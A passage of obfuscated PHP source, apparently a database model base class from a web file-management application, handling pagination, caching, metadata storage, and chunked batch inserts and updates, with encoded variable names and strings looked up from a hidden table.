unset($ğ½£êµ­); } protected function _afterFind(&$­è«é¨, $»ÉÛ™²‰) { if (!is_array($­è«é¨)) { return; } if (!$this->checkDataAutoHas($_SERVER[”øäÃÍª][432])) { return; } $this->dataAfterFilter($­è«é¨); } public static function textEncode($õ°ô¿ ç) { if (!$õ°ô¿ ç) { return $õ°ô¿ ç; } $ã¿¤˜Œ£ = json_encode($õ°ô¿ ç); $ã¿¤˜Œ£ = preg_replace_callback($_SERVER[”øäÃÍª][433], function ($øËÜá«) { return addslashes($øËÜá«[0]); }, $ã¿¤˜Œ£); return json_decode($ã¿¤˜Œ£); } public static function textDecode($„ç³–Ïº) { $ä°ı¯‘ =& $_SERVER[”øäÃÍª]; if (!$„ç³–Ïº) { return $„ç³–Ïº; } $Ìú†œïÆ = json_encode($„ç³–Ïº); $Ìú†œïÆ = preg_replace_callback($ä°ı¯‘[434], function ($âé¼¨ÉÍ) { return $_SERVER[”øäÃÍª][97]; }, $Ìú†œïÆ); return json_decode($Ìú†œïÆ); } public function setAutoIncrement($§ó†…ï) { $ÅÔ°ô–« = array($this->getPk() => $§ó†…ï); $íè„º”® = $this->data($ÅÔ°ô–«)->add(); if ($íè„º”®) { $this->delete($íè„º”®); } } public function getAutoIncrement() { $”£òƒó = $this->getTableName(); $Ü÷şï¸Ü = $this->max($this->getPk()); $ÇÔ‹™Â¤ = $this->query("\163\x68\x6f\167\40\x74\141\142\x6c\145\x20\x73\x74\141\164\x75\x73\40\167\150\145\162\x65\40\x4e\x61\x6d\145\x3d\x27{$”£òƒó}\x27"); $¢Ì»êÇ± = $ÇÔ‹™Â¤[0][$_SERVER[”øäÃÍª][435]]; $ÑÆ™Éàø = max($Ü÷şï¸Ü, $¢Ì»êÇ±); return $ÑÆ™Éàø; } protected function _callBefore($í­Ìı½¤, $²õ«„İç) { return $this->cacheCallCheck($í­Ìı½¤, $²õ«„İç, !1); } protected function _callAfter($¬È’ŠÜÉ, $Ñ”Ñúê) { return $this->cacheCallCheck($¬È’ŠÜÉ, $Ñ”Ñúê, !0); } protected function cacheFunctionAlias($‚­§›©) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ü”¶ÆÔ», $ÖÆêää×, $Ÿïı‚µ  = false) { $…ÂáÈ—€ =& $_SERVER[”øäÃÍª]; $‘”å½ä = $this->cacheFunctionAlias($ÖÆêää×); if (!$‘”å½ä) { return; } foreach ($‘”å½ä as $ó±£©â† => $èÖìˆ²á) { $ç‘ØöØ = $èÖìˆ²á[0]; $—³ÛøÚ„ = explode($…ÂáÈ—€[50], $èÖìˆ²á[1]); $ÀÁ¨ÙàÔ = isset($èÖìˆ²á[2]) ? $èÖìˆ²á[2] : $…ÂáÈ—€[12]; if ($Ü”¶ÆÔ» == $ó±£©â†) { return $this->cacheFunctionGet($ó±£©â†, $ç‘ØöØ, $ÀÁ¨ÙàÔ); } if ($Ÿïı‚µ  && in_array($Ü”¶ÆÔ», $—³ÛøÚ„)) { $this->cacheFunctionClear($ó±£©â†, $ç‘ØöØ, $ÀÁ¨ÙàÔ); } } } public function cacheFunctionGet($†µÏà·â, $‚ùƒÃ©¢, $¶Ÿ—™ÒŞ = '') { $Ï¸º÷²Ñ =& $_SERVER[”øäÃÍª]; $¥•Üïü = $this->cacheKeyMake($†µÏà·â, $‚ùƒÃ©¢, $¶Ÿ—™ÒŞ); $ôÃ´Ûø¿ = Cache::get($¥•Üïü); if (!is_array($ôÃ´Ûø¿)) { if (method_exists($this, $Ï¸º÷²Ñ[341] . $†µÏà·â)) { $†µÏà·â = $Ï¸º÷²Ñ[341] . $†µÏà·â; } $ôÃ´Ûø¿ = call_user_func_array(array($this, $†µÏà·â), array($‚ùƒÃ©¢, !0)); Cache::set($¥•Üïü, $ôÃ´Ûø¿); } return $ôÃ´Ûø¿; } public function cacheFunctionClear($ıÈ³ªŞ, $ç¢ÀÉÊº, $±ÔåµÄ = '') { $áÊÚ¶¥Ÿ = $ç¢ÀÉÊº; if (!is_array($ç¢ÀÉÊº)) { $áÊÚ¶¥Ÿ = array($ç¢ÀÉÊº); } foreach ($áÊÚ¶¥Ÿ as $»†ìøö) { $ö˜İß€¾ = $this->cacheKeyMake($ıÈ³ªŞ, $»†ìøö, $±ÔåµÄ); Cache::remove($ö˜İß€¾); } } public function cacheKeyMake($Ô¼’€”’, $âóî®æ£, $¼·¹¡ÄÃ) { $ñé‡ñÚÊ =& $_SERVER[”øäÃÍª]; if ($¼·¹¡ÄÃ) { $âóî®æ£ = $âóî®æ£ . $ñé‡ñÚÊ[436] . $¼·¹¡ÄÃ; } return get_class($this) . $ñé‡ñÚÊ[11] . $Ô¼’€”’ . $ñé‡ñÚÊ[437] . $âóî®æ£; } protected function selectPageReset() { $€ªè­•Â =& $_SERVER[”øäÃÍª]; if (isset($GLOBALS[$€ªè­•Â[438]])) { return; } $GLOBALS[$€ªè­•Â[438]] = isset($GLOBALS[$€ªè­•Â[7]][$€ªè­•Â[439]]) ? $GLOBALS[$€ªè­•Â[7]][$€ªè­•Â[439]] : !1; $GLOBALS[$€ªè­•Â[440]] = isset($GLOBALS[$€ªè­•Â[7]][$€ªè­•Â[428]]) ? $GLOBALS[$€ªè­•Â[7]][$€ªè­•Â[428]] : !1; $GLOBALS[$€ªè­•Â[7]][$€ªè­•Â[439]] = !1; $GLOBALS[$€ªè­•Â[7]][$€ªè­•Â[428]] = !1; } protected function selectPageRestore() { $ú¿ÍòŸµ =& $_SERVER[”øäÃÍª]; if (!isset($GLOBALS[$ú¿ÍòŸµ[438]])) { return; } $GLOBALS[$ú¿ÍòŸµ[7]][$ú¿ÍòŸµ[439]] = $GLOBALS[$ú¿ÍòŸµ[438]]; $GLOBALS[$ú¿ÍòŸµ[7]][$ú¿ÍòŸµ[428]] = $GLOBALS[$ú¿ÍòŸµ[440]]; if ($GLOBALS[$ú¿ÍòŸµ[7]][$ú¿ÍòŸµ[439]] === !1) { unset($GLOBALS[$ú¿ÍòŸµ[7]][$ú¿ÍòŸµ[439]]); } if ($GLOBALS[$ú¿ÍòŸµ[7]][$ú¿ÍòŸµ[428]] === !1) { unset($GLOBALS[$ú¿ÍòŸµ[7]][$ú¿ÍòŸµ[428]]); } unset($GLOBALS[$ú¿ÍòŸµ[438]]); unset($GLOBALS[$ú¿ÍòŸµ[440]]); } protected function selectPage($ÚïâÉ¼Ø = 200, $‡¢åœ¨Á = 1) { $ò²£õşì =& $_SERVER[”øäÃÍª]; global $in; $ Øı¬óœ = $this->optionsValue(); $ïÌ®„÷É = 50000; $ÚïâÉ¼Ø = isset($in[$ò²£õşì[439]]) && $in[$ò²£õşì[439]] ? $in[$ò²£õşì[439]] : $ÚïâÉ¼Ø; if ($ÚïâÉ¼Ø === -1) { $in[$ò²£õşì[439]] = !1; $ïÌ®„÷É = 100000000; $ÚïâÉ¼Ø = $ïÌ®„÷É; } $Òß“×É° = $ Øı¬óœ; $Òß“×É°[$ò²£õşì[441]] = array(); $ÚïâÉ¼Ø = intval($ÚïâÉ¼Ø); $ÚïâÉ¼Ø = $ÚïâÉ¼Ø <= 5 ? 5 : ($ÚïâÉ¼Ø >= $ïÌ®„÷É ? $ïÌ®„÷É : $ÚïâÉ¼Ø); $‡¢åœ¨Á = intval(isset($in[$ò²£õşì[428]]) && $in[$ò²£õşì[428]] ? $in[$ò²£õşì[428]] : $‡¢åœ¨Á); $‡¢åœ¨Á = $‡¢åœ¨Á <= 1 ? 1 : $‡¢åœ¨Á; $ëÇ§àæ¼ = array(); $˜ÏˆÄ€ƒ = 1; $ÈÆŒéî = $this->selectPageCountBy(); if ($‡¢åœ¨Á == 1 && $˜ÏˆÄ€ƒ) { $this->optionsValue($ Øı¬óœ); $ëÇ§àæ¼ = $this->page($‡¢åœ¨Á, $ÚïâÉ¼Ø)->select(); $ŸŸÆ÷ Œ = is_array($ëÇ§àæ¼) ? count($ëÇ§àæ¼) : 0; if ($ŸŸÆ÷ Œ < $ÚïâÉ¼Ø) { $¬ÓÕ§šÑ = 1; } else { $this->optionsValue($Òß“×É°); $ŸŸÆ÷ Œ = intval($this->count($ÈÆŒéî)); $¬ÓÕ§šÑ = ceil($ŸŸÆ÷ Œ / $ÚïâÉ¼Ø); } } else { $this->optionsValue($Òß“×É°); $ŸŸÆ÷ Œ = intval($this->count($ÈÆŒéî)); $¬ÓÕ§šÑ = ceil($ŸŸÆ÷ Œ / $ÚïâÉ¼Ø); $‡¢åœ¨Á = $‡¢åœ¨Á >= $¬ÓÕ§šÑ ? $¬ÓÕ§šÑ : $‡¢åœ¨Á; $this->optionsValue($ Øı¬óœ); $ëÇ§àæ¼ = $this->page($‡¢åœ¨Á, $ÚïâÉ¼Ø)->select(); } $this->selectPageCountBy($ò²£õşì[442]); if (!is_array($ëÇ§àæ¼)) { $ëÇ§àæ¼ = array(); } if ($¬ÓÕ§šÑ == 1) { $ŸŸÆ÷ Œ = count($ëÇ§àæ¼); } $÷‰Ó­¶ = array($ò²£õşì[443] => array($ò²£õşì[444] => $ŸŸÆ÷ Œ, $ò²£õşì[439] => $ÚïâÉ¼Ø, $ò²£õşì[428] => $‡¢åœ¨Á, $ò²£õşì[445] => $¬ÓÕ§šÑ), $ò²£õşì[446] => $ëÇ§àæ¼); return $÷‰Ó­¶; } protected function selectPageCountBy($¤Ôşø’Ü = false) { static $éÄ½ëÏĞ = null; if (!$¤Ôşø’Ü) { return $éÄ½ëÏĞ; } if ($¤Ôşø’Ü == $_SERVER[”øäÃÍª][442]) { $éÄ½ëÏĞ = null; return; } $éÄ½ëÏĞ = $¤Ôşø’Ü; } protected function checkLength($¯é¸ıµµ, $¯¾Üò· = 0, $ŒÇ¬›Òˆ = '') { $á‘ñí°ü =& $_SERVER[”øäÃÍª]; $¯¾Üò· = $¯¾Üò· ? $¯¾Üò· : 65536; if (!$¯é¸ıµµ || strlen($¯é¸ıµµ) < $¯¾Üò·) { return; } $ŒÇ¬›Òˆ = $ŒÇ¬›Òˆ ? $ŒÇ¬›Òˆ . $á‘ñí°ü[74] : $á‘ñí°ü[12]; show_json($ŒÇ¬›Òˆ . LNG($á‘ñí°ü[447]) . "\x28{$¯¾Üò·}\x29", !1); } protected function metaSet($ÚĞÔƒèÆ, $ÎĞîèÅ‰ = null, $Í€Áë‘ş = null) { $åÎŒÉ¹€ =& $_SERVER[”øäÃÍª]; if (!$this->tableMeta || !$ÚĞÔƒèÆ) { return !1; } $ÒÂˆéû™ = $this->tableMeta[$åÎŒÉ¹€[448]]; $ñĞ­¥Æ = $this->tableMeta[$åÎŒÉ¹€[449]]; $ÂëÁ£Ş° = Model($ñĞ­¥Æ); $œùøÙ‚— = array($ÒÂˆéû™ => $ÚĞÔƒèÆ, $åÎŒÉ¹€[450] => $ÎĞîèÅ‰); if (is_null($ÎĞîèÅ‰)) { return $ÂëÁ£Ş°->where(array($ÒÂˆéû™ => $ÚĞÔƒèÆ))->delete(); } if (is_null($Í€Áë‘ş) && is_string($ÎĞîèÅ‰)) { return $ÂëÁ£Ş°->where($œùøÙ‚—)->delete(); } $ñéêöË = is_array($ÎĞîèÅ‰) ? $ÎĞîèÅ‰ : array(); if (is_string($ÎĞîèÅ‰)) { $ñéêöË[$ÎĞîèÅ‰] = $Í€Áë‘ş; } $µú‡È ¾ = array(); foreach ($ñéêöË as $¥ ¥Âê => $“§òØõí) { if (is_null($“§òØõí) && is_string($¥ ¥Âê)) { $ÂëÁ£Ş°->where(array($ÒÂˆéû™ => $ÚĞÔƒèÆ, $åÎŒÉ¹€[450] => $¥ ¥Âê))->delete(); continue; } $this->checkLength($“§òØõí, !1, $ñĞ­¥Æ . $åÎŒÉ¹€[4] . $¥ ¥Âê); $µú‡È ¾[] = array($ÒÂˆéû™ => $ÚĞÔƒèÆ, $åÎŒÉ¹€[95] => $¥ ¥Âê, $åÎŒÉ¹€[451] => $“§òØõí); } $ŠñŸ«ƒ = $åÎŒÉ¹€[452] . $ñĞ­¥Æ; CacheLock::lock($ŠñŸ«ƒ); $ÂëÁ£Ş°->where(array($ÒÂˆéû™ => $ÚĞÔƒèÆ))->addAll($µú‡È ¾, array(), !0); CacheLock::unlock($ŠñŸ«ƒ); return !0; } public function metaGet($äÈäƒÔ³, $Ëà”ú©å = false) { $Ş×ØÄ¿ =& $_SERVER[”øäÃÍª]; if (!$this->tableMeta) { return array(); } $Á¯Ûàé“ = $this->tableMeta[$Ş×ØÄ¿[448]]; $ËÕÖ”Êê = Model($this->tableMeta[$Ş×ØÄ¿[449]]); if ($Ëà”ú©å) { $ĞÄú”¥® = array($Á¯Ûàé“ => $äÈäƒÔ³, $Ş×ØÄ¿[95] => $Ëà”ú©å); return $ËÕÖ”Êê->where($ĞÄú”¥®)->getField($Ş×ØÄ¿[451]); } $ĞÄú”¥® = array($Á¯Ûàé“ => $äÈäƒÔ³); $Ûê½²†à = $ËÕÖ”Êê->field($Ş×ØÄ¿[453])->where($ĞÄú”¥®)->select(); $Ûê½²†à = array_to_keyvalue($Ûê½²†à, $Ş×ØÄ¿[95], $Ş×ØÄ¿[451]); return $Ûê½²†à; } private function checkDataAutoHas($üîŒîÎñ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ôÇùäÊ) { if (in_array($üîŒîÎñ, explode($_SERVER[”øäÃÍª][50], $ôÇùäÊ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ìŞÚüğ, $íãß£ğş) { $‰¾Œõ¢ =& $_SERVER[”øäÃÍª]; if (!is_array($ìŞÚüğ)) { return; } foreach ($this->dataAuto as $‡„Æ¿é´) { $œá©ˆ½ = $‡„Æ¿é´[0]; if (!in_array($íãß£ğş, explode($‰¾Œõ¢[50], $‡„Æ¿é´[2]))) { continue; } switch (trim($‡„Æ¿é´[3])) { case $‰¾Œõ¢[396]: case $‰¾Œõ¢[397]: $ıˆíã“Ş = $‡„Æ¿é´[1]; $£¨“­ = isset($‡„Æ¿é´[4]) ? (array) $‡„Æ¿é´[4] : array(); if ($ıˆíã“Ş == $‰¾Œõ¢[204] && array_key_exists($œá©ˆ½, $ìŞÚüğ)) { if (!$ìŞÚüğ[$œá©ˆ½]) { unset($ìŞÚüğ[$œá©ˆ½]); } break; } if (isset($ìŞÚüğ[$œá©ˆ½])) { array_unshift($£¨“­, $ìŞÚüğ[$œá©ˆ½]); } if ($‰¾Œõ¢[396] == $‡„Æ¿é´[3]) { $ìŞÚüğ[$œá©ˆ½] = call_user_func_array($ıˆíã“Ş, $£¨“­); } else { $ìŞÚüğ[$œá©ˆ½] = call_user_func_array(array(&$this, $ıˆíã“Ş), $£¨“­); } break; case $‰¾Œõ¢[348]: if (isset($ìŞÚüğ[$œá©ˆ½]) && $ìŞÚüğ[$œá©ˆ½]) { $ìŞÚüğ[$œá©ˆ½] = call_user_func_array(array(&$this, $‡„Æ¿é´[1]), array($ìŞÚüğ[$œá©ˆ½])); } break; case $‰¾Œõ¢[351]: $ìŞÚüğ[$œá©ˆ½] = $ìŞÚüğ[$‡„Æ¿é´[1]]; break; case $‰¾Œõ¢[369]: if (isset($ìŞÚüğ[$œá©ˆ½]) && !is_string($ìŞÚüğ[$œá©ˆ½])) { $ìŞÚüğ[$œá©ˆ½] = json_encode_force($ìŞÚüğ[$œá©ˆ½]); $ìŞÚüğ[$œá©ˆ½] = self::textEncode($ìŞÚüğ[$œá©ˆ½]); } break; case $‰¾Œõ¢[398]: if ($ìŞÚüğ[$œá©ˆ½] === $‰¾Œõ¢[12]) { unset($ìŞÚüğ[$œá©ˆ½]); } break; case $‰¾Œõ¢[399]: $ìŞÚüğ[$œá©ˆ½] = $‡„Æ¿é´[1]; default: break; } } if ($íãß£ğş == $‰¾Œõ¢[430]) { $“¼…ï = strtolower($this->db->getDbType()); if (strpos($“¼…ï, $‰¾Œõ¢[13]) !== 0) { return; } $½Ùøë…  = $this->field(!0)->fields; $êğüëï¿ = $½Ùøë… [$‰¾Œõ¢[329]]; if (isset($½Ùøë… [$‰¾Œõ¢[328]])) { unset($êğüëï¿[$½Ùøë… [$‰¾Œõ¢[328]]]); } foreach ($êğüëï¿ as $ºØ´İçÀ => $íãß£ğş) { if (!isset($ìŞÚüğ[$ºØ´İçÀ])) { $ìŞÚüğ[$ºØ´İçÀ] = $‰¾Œõ¢[12]; } } } } private function dataAfterFilter(&$ äØ¡¯ï) { $Ñš÷—‰” =& $_SERVER[”øäÃÍª]; foreach ($this->dataAuto as $ÏÍÀÑ¹) { $æûšüàá = $ÏÍÀÑ¹[0]; if (!isset($ äØ¡¯ï[$æûšüàá])) { continue; } if (!in_array($Ñš÷—‰”[432], explode($Ñš÷—‰”[50], $ÏÍÀÑ¹[2]))) { continue; } switch (trim($ÏÍÀÑ¹[3])) { case $Ñš÷—‰”[396]: case $Ñš÷—‰”[397]: $Š®¯–‹» = isset($ÏÍÀÑ¹[4]) ? (array) $ÏÍÀÑ¹[4] : array(); array_unshift($Š®¯–‹», $ äØ¡¯ï[$æûšüàá]); if (isset($ÏÍÀÑ¹[4]) && $ÏÍÀÑ¹[4] == $Ñš÷—‰”[454]) { $Š®¯–‹» = array($ äØ¡¯ï[$æûšüàá]); } if ($Ñš÷—‰”[396] == $ÏÍÀÑ¹[3]) { $ äØ¡¯ï[$æûšüàá] = call_user_func_array($ÏÍÀÑ¹[1], $Š®¯–‹»); } else { $ äØ¡¯ï[$æûšüàá] = call_user_func_array(array(&$this, $ÏÍÀÑ¹[1]), $Š®¯–‹»); } break; case $Ñš÷—‰”[348]: if (isset($ äØ¡¯ï[$æûšüàá]) && $ äØ¡¯ï[$æûšüàá]) { $ äØ¡¯ï[$æûšüàá] = call_user_func_array(array(&$this, $ÏÍÀÑ¹[1]), array($ äØ¡¯ï[$æûšüàá])); } break; case $Ñš÷—‰”[351]: $ äØ¡¯ï[$æûšüàá] = $ äØ¡¯ï[$ÏÍÀÑ¹[1]]; break; case $Ñš÷—‰”[369]: $ÒãïÊğ¬ = $ äØ¡¯ï[$æûšüàá]; $ÒãïÊğ¬ = self::textDecode($ÒãïÊğ¬); $ äØ¡¯ï[$æûšüàá] = json_decode($ÒãïÊğ¬, !0); if (is_null($ äØ¡¯ï[$æûšüàá])) { $ äØ¡¯ï[$æûšüàá] = $ÒãïÊğ¬; } break; case $Ñš÷—‰”[398]: if ($ äØ¡¯ï[$æûšüàá] === $Ñš÷—‰”[12]) { unset($ äØ¡¯ï[$æûšüàá]); } break; case $Ñš÷—‰”[399]: $ äØ¡¯ï[$æûšüàá] = $ÏÍÀÑ¹[1]; break; default: break; } } } public function saveAll($´Ğšäìî, $¹” ‘şá = false) { $åËƒâ =& $_SERVER[”øäÃÍª]; $€¤ÚšÈà = $this->db; $¢’ÊÆ = $this->tablePrefix . $this->tableName; $Œ Çû‹  = $this->saveAllChunkMake($´Ğšäìî); $¹” ‘şá = is_array($¹” ‘şá) ? $¹” ‘şá : array(); foreach ($Œ Çû‹  as $ŸüÙ–Ú¾) { $ù¾à„Ãª = $åËƒâ[12]; $¼ãùïí = $åËƒâ[12]; $İÒßÌ = array(); $—³ş„¢ = array(); foreach ($ŸüÙ–Ú¾ as $ˆ´ìèÔÏ => $°¬´æ…) { $ù¾à„Ãª = $°¬´æ…[$åËƒâ[455]]; $—³ş„¢[] = $°¬´æ…[$åËƒâ[456]]; $§Ÿ²áµï = $€¤ÚšÈà->parseValue($°¬´æ…[$åËƒâ[456]]); foreach ($°¬´æ…[$åËƒâ[457]] as $¾î¶ÅØÖ => $ğñ¥Ó») { if (!$İÒßÌ[$¾î¶ÅØÖ]) { $İÒßÌ[$¾î¶ÅØÖ] = array(); } $İÒßÌ[$¾î¶ÅØÖ][] = $åËƒâ[458] . $§Ÿ²áµï . $åËƒâ[459] . $€¤ÚšÈà->parseValue($ğñ¥Ó»); } } $â™ïŸ• = $ù¾à„Ãª; $â™ïŸ• = $€¤ÚšÈà->parseKey($â™ïŸ•); foreach ($İÒßÌ as $¾î¶ÅØÖ => $Ö¦°ôÏ‚) { $¼ãùïí .= $åËƒâ[285] . $€¤ÚšÈà->parseKey($¾î¶ÅØÖ) . $åËƒâ[460] . $â™ïŸ• . $åËƒâ[461]; $¼ãùïí .= implode($åËƒâ[285], $Ö¦°ôÏ‚) . $åËƒâ[462]; } $ÓçßÎ‰Ù = $¹” ‘şá; $ÓçßÎ‰Ù[$ù¾à„Ãª] = array($åËƒâ[7], $—³ş„¢); $üöÎİÔ¤ = "\x55\120\x44\x41\124\105\40\x60{$¢’ÊÆ}\x60\40\x53\x45\124\40" . rtrim($¼ãùïí, $åËƒâ[50]) . $åËƒâ[285] . $€¤ÚšÈà->parseWhere($ÓçßÎ‰Ù); $this->execute($üöÎİÔ¤); $this->chunkEventCheck(count($ŸüÙ–Ú¾)); } $this->chunkEventSet(); } public function saveAllEach($ „º¼§Ÿ, $Ò€¶ş– = false) { $À ô‘ª =& $_SERVER[”øäÃÍª]; $™¬¾ÙĞ = $this->db; $º’‚Şéü = $this->tablePrefix . $this->tableName; $Ô é–É = $this->saveAllChunkMake($ „º¼§Ÿ); $Ò€¶ş– = is_array($Ò€¶ş–) ? $Ò€¶ş– : array(); foreach ($Ô é–É as $’À½Ğí›) { foreach ($’À½Ğí› as $¨Ñ›ÕÖµ => $‰¶ûş¼Œ) { $ÌÈüİ™ô = $À ô‘ª[463]; foreach ($‰¶ûş¼Œ[$À ô‘ª[457]] as $Ä¾À”ï´ => $«ı¬İ›È) { $ÌÈüİ™ô .= $™¬¾ÙĞ->parseKey($Ä¾À”ï´) . $À ô‘ª[464] . $™¬¾ÙĞ->parseValue($«ı¬İ›È) . $À ô‘ª[50]; } $ÔŞÄ§Óæ = $Ò€¶ş–; $ÔŞÄ§Óæ[$‰¶ûş¼Œ[$À ô‘ª[455]]] = $‰¶ûş¼Œ[$À ô‘ª[456]]; $¿£ü”­ = "\x55\120\x44\101\x54\105\40\140{$º’‚Şéü}\140\x20\123\x45\x54\x20" . rtrim($ÌÈüİ™ô, $À ô‘ª[50]) . $À ô‘ª[465] . $™¬¾ÙĞ->parseWhere($ÔŞÄ§Óæ) . $À ô‘ª[466]; $this->execute($¿£ü”­); } $this->chunkEventCheck(count($’À½Ğí›)); } $this->chunkEventSet(); } private function saveAllChunkMake($¦¼Õ¯×ó) { $¥ÆƒæÒÛ =& $_SERVER[”øäÃÍª]; $Ø¢º¦ïÛ = self::SQL_WHERE_IN_CHUNK; $¦¼Õ¯×ó = is_array($¦¼Õ¯×ó) ? $¦¼Õ¯×ó : array(); $‡İˆÕå¶ = array(); $´ûÍÓÓŒ = ceil(count($¦¼Õ¯×ó) / $Ø¢º¦ïÛ); for ($¯ºËàÄŒ = 0; $¯ºËàÄŒ < $´ûÍÓÓŒ; $¯ºËàÄŒ++) { $×˜Á­»é = array(); $ÌŞª×Æê = array_slice($¦¼Õ¯×ó, $¯ºËàÄŒ * $Ø¢º¦ïÛ, $Ø¢º¦ïÛ); foreach ($ÌŞª×Æê as $È³äŸåş) { if (!is_array($È³äŸåş) || count($È³äŸåş) < 4 || count($È³äŸåş) % 2 != 0) { continue; } $äÇ¦Ïû = array(); for ($ˆØ”¨×š = 2; $ˆØ”¨×š < count($È³äŸåş); $ˆØ”¨×š += 2) { $äÇ¦Ïû[$È³äŸåş[$ˆØ”¨×š]] = $È³äŸåş[$ˆØ”¨×š + 1]; } $×˜Á­»é[] = array($¥ÆƒæÒÛ[455] => $È³äŸåş[0], $¥ÆƒæÒÛ[456] => $È³äŸåş[1], $¥ÆƒæÒÛ[457] => $äÇ¦Ïû); } $‡İˆÕå¶[] = $×˜Á­»é; } return $‡İˆÕå¶; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¡òØªµò = false, $Ù‡®ş„Ù = false) { $this->_chunkEvent = $¡òØªµò; $this->_chunkEventParam = $Ù‡®ş„Ù; } private function chunkEventCheck($Êû–ù¿ì) { if (!$this->_chunkEvent) { return; } $’Úª¢Ñ‰ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $’Úª¢Ñ‰[$_SERVER[”øäÃÍª][467]] = $Êû–ù¿ì; Hook::trigger($this->_chunkEvent, $’Úª¢Ñ‰); } public function addAll($Éâ˜“¯î, $ë®Óƒ®™ = array(), $€ÃÃ«Ö = false) { $ˆ¯†Éé› =& $_SERVER[”øäÃÍª]; ignore_timeout(); $¸Şúî­í = self::SQL_WHERE_IN_CHUNK; if (empty($Éâ˜“¯î)) { $this->error = think_lang($ˆ¯†Éé›[349]); return !1; } $ë®Óƒ®™ = $this->_parseOptions($ë®Óƒ®™); foreach ($Éâ˜“¯î as $Şƒƒ®˜Â => $üÁ•“¯Á) { $Éâ˜“¯î[$Şƒƒ®˜Â] = $this->_facade($üÁ•“¯Á); $this->_beforeInsert($Éâ˜“¯î[$Şƒƒ®˜Â], $ë®Óƒ®™); } if (method_exists($this->db, $ˆ¯†Éé›[350])) { for ($›¾ÎÔş = 0; $›¾ÎÔş < count($Éâ˜“¯î); $›¾ÎÔş += $¸Şúî­í) { $¯©ùÕé× = array_slice($Éâ˜“¯î, $›¾ÎÔş, $¸Şúî­í); if (!is_array($¯©ùÕé×) || count($¯©ùÕé×) == 0) { break; } $ŞÉŒæÖİ = $this->db->insertAll($¯©ùÕé×, $ë®Óƒ®™, $€ÃÃ«Ö); $this->chunkEventCheck(count($¯©ùÕé×)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Éâ˜“¯î as $Şƒƒ®˜Â => $üÁ•“¯Á) { $ŞÉŒæÖİ = $this->db->insert($üÁ•“¯Á, $ë®Óƒ®™, $€ÃÃ«Ö); } $this->commit(); } if (!1 !== $ŞÉŒæÖİ) { $‰ÎÁƒŒø = $this->getLastInsID(); if ($‰ÎÁƒŒø) { return $‰ÎÁƒŒø; } } return $ŞÉŒæÖİ; } public function save($¥«üó¦Ì = '', $×¾ßå = array()) { $÷êŠİ†È =& $_SERVER[”øäÃÍª]; $ï„‘É«å = self::SQL_WHERE_IN_CHUNK; $ã­‹£ùû = $this->optionsValue(); $äù‡ò×ş = $this->findWhereField($ã­‹£ùû); if (!$äù‡ò×ş) { return parent::save($¥«üó¦Ì, $×¾ßå); } $İà ´š„ = 0; $İÜúš¦® = $ã­‹£ùû[$÷êŠİ†È[353]][$äù‡ò×ş][1]; $İÜúš¦® = is_array($İÜúš¦®) ? $İÜúš¦® : array(); $€ñÏ©“¤ = count($İÜúš¦®); for ($ÎÁ„Ê„ = 0; $ÎÁ„Ê„ < $€ñÏ©“¤; $ÎÁ„Ê„ += $ï„‘É«å) { $¹•½¤Í = array_slice($İÜúš¦®, $ÎÁ„Ê„, $ï„‘É«å); if (!is_array($¹•½¤Í) || count($¹•½¤Í) == 0) { break; } $ã­‹£ùû[$÷êŠİ†È[353]][$äù‡ò×ş][1] = $¹•½¤Í; $this->optionsValue($ã­‹£ùû); $İà ´š„ += parent::save($¥«üó¦Ì, $×¾ßå); $this->chunkEventCheck(count($¹•½¤Í)); } $this->chunkEventSet(); return $İà ´š„; } public function add($¾ï¶¤Ò = '', $ó¹Ãƒş¾ = array(), $Í›…˜è· = false) { if ($this->addTaskStatus && is_array($¾ï¶¤Ò)) { $this->addTaskData[] = $¾ï¶¤Ò; return; } return parent::add($¾ï¶¤Ò, $ó¹Ãƒş¾, $Í›…˜è·); } public function parseWhereLike($û¯ê©Àé, $à¶ñœÍ = '', $çèö«§ˆ = false, &$ø½©«‹Ç = false) { $„»ıƒ–— =& $_SERVER[”øäÃÍª]; $Øêúé¾ş = $GLOBALS[$„»ıƒ–—[6]][$„»ıƒ–—[468]]; if (!$Øêúé¾ş[$„»ıƒ–—[469]]) { return $û¯ê©Àé; } if (!in_array($this->tableName, array($„»ıƒ–—[429], $„»ıƒ–—[470], $„»ıƒ–—[471], $„»ıƒ–—[472]))) { return $û¯ê©Àé; } if (!is_array($û¯ê©Àé)) { return $û¯ê©Àé; } $ÅÔÍœŠî = array(); $¨ëÁËÕä = 0; foreach ($û¯ê©Àé as $­™…¸ÖÛ => $íĞ²ÙÕñ) { if (is_array($íĞ²ÙÕñ) && count($íĞ²ÙÕñ) == 2 && $íĞ²ÙÕñ[0] == $„»ıƒ–—[473] && is_string($íĞ²ÙÕñ[1]) && substr($íĞ²ÙÕñ[1], 0, 1) == $„»ıƒ–—[474] && substr($íĞ²ÙÕñ[1], strlen($íĞ²ÙÕñ[1]) - 1, 1) == $„»ıƒ–—[474]) { $ø½©«‹Ç = !0; $Ûû¯¨ÅÍ = is_string($­™…¸ÖÛ) ? $­™…¸ÖÛ : $à¶ñœÍ; $«øŠ«¥¨ = substr($íĞ²ÙÕñ[1], 1, strlen($íĞ²ÙÕñ[1]) - 2); $«øŠ«¥¨ = $this->db->escapeString($«øŠ«¥¨); if (!strpos($Ûû¯¨ÅÍ, $„»ıƒ–—[10])) { $Ûû¯¨ÅÍ = $„»ıƒ–—[475] . $Ûû¯¨ÅÍ . $„»ıƒ–—[475]; } $íûì¼Ô = $„»ıƒ–—[220] . $«øŠ«¥¨ . $„»ıƒ–—[220]; $«øŠ«¥¨ = str_replace(array($„»ıƒ–—[10], $„»ıƒ–—[476], $„»ıƒ–—[11]), $„»ıƒ–—[477], $«øŠ«¥¨); if ($Øêúé¾ş[$„»ıƒ–—[478]]) { $íûì¼Ô = $„»ıƒ–—[479] . $«øŠ«¥¨ . $„»ıƒ–—[480]; if ($Øêúé¾ş[$„»ıƒ–—[481]]) { $íûì¼Ô = $„»ıƒ–—[480] . $«øŠ«¥¨ . $„»ıƒ–—[479]; } } $é «ß = Hook::trigger($„»ıƒ–—[482], $«øŠ«¥¨, $íûì¼Ô); if ($é «ß) { $íûì¼Ô = $é «ß; } 